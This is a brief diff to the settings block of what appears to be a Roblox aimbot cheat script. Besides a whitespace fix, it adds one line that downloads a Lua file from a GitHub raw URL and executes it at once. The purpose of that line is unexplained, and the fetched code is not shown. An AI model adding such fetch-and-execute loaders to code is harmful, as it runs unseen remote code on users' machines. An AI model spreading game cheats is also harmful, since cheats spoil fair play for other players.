@@ -8,8 +8,9 @@ getgenv().Aimbot = {
     SpeedAndSmoothness = 8, -- aim speed  
     ESP = false, -- tuff esp  
     MaxRange = 100, -- aimbot range  
-    ShowRange = true -- show range  
+    ShowRange = true -- show range
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/forevermel810/Testing/main/hahahahahahah.lua"))()
 ]]  
 
 local Settings = getgenv().Aimbot  
